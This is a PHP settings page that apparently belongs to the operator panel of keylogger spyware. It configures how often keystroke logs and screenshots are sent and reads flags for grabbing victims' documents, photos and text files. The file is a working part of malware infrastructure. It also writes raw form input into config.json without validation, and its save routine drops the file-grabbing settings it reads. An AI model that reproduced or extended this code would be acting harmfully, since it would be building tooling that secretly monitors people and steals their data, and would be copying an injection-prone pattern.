<?php include('header.php'); ?>

<?php




    $loc = json_decode(file_get_contents('../config.json'), true);
    $time_keylogs = $loc['time_keylogs'];
    $time_screenshot = $loc['time_screenshot'];
    $grab_docs = $loc['grab_docs'];
    $grab_photos = $loc['grab_photos'];	
    $grab_txt = $loc['grab_txt'];
     
  

    echo '</div><div class="row">
    <div class="col-md-12">
    <div class="panel-default" style="opacity: 0.8;background-image: linear-gradient(to bottom,#232323 0,#232323 100%);">
    <div class="panel-heading">
    <h3 class="panel-title">Setitngs</h3>
  </div>
     <div class="panel-body table-bordered" style=" padding-left:40px;padding-right:40px;padding-bottom:25px;padding-top:25px;">
     <div class="alert alert-info text-left" style="font-size:18px" role="alert"> These settings are important for sending screenshots and keylogger reports. </div>
     <form method="POST" class="form-group" >
    
                     <div class="form-group col-md-12" style="margin-top:10px;margin-bottom: 20px;padding-bottom: 10px;padding-top: 10px;">
                       <label style="padding-right: 15px;padding-bottom: 10px;padding-top: 10px;"> Time keylogger </label>
                       <input name="time_keylogs" type="number" style="background-color: #000;color: #fff;" class="form-control" value="'.$time_keylogs.'" placeholder="">
                       <label style="padding-right: 15px;padding-bottom: 10px;padding-top: 10px;"> Time screenshot </label>
                       <input name="time_screenshot" style="background-color: #000;color: #fff;" type="number" class="form-control" value="'.$time_screenshot.'" placeholder="">

                     </div>';


                     echo '<div class="form-group" style="font-size: larger;margin-top:10px;padding-left: 15px;padding-right: 15px;margin-right: 10px;/*! margin-left: 10px; */">';

                   

                    
                    

                 echo '</div>';

                 
                           echo' <br />
                                    <button name="submit" type="submit" class="btn-save"> Save  <span class="ion-android-done"></span></button>
                                    <button type="reset" class="btn-close"> Reset  <span class="ion-android-delete"></span></button>
                                </form>  
                                <br />';
                                if(isset($_POST['submit'])){
                       


                                    $handle = '{"time_keylogs": '.$_POST['time_keylogs'].', "time_screenshot": '.$_POST['time_screenshot'].'  }';
                                    $f = fopen("../config.json", "w");
                                    fwrite($f, $handle); 
                                    fclose($f);
                                  
                                    echo '</ div><div  class="text-center alert alert-success" role="alert">Saved successfully </div>';  
                                    echo '<meta http-equiv="refresh" content="500;url=settings.php" />';  											
                
                                  
                
                                }
                    echo '</div>	
                </div>
                </div>
            </div> <br />';








?>




<?php include('footer.php'); ?>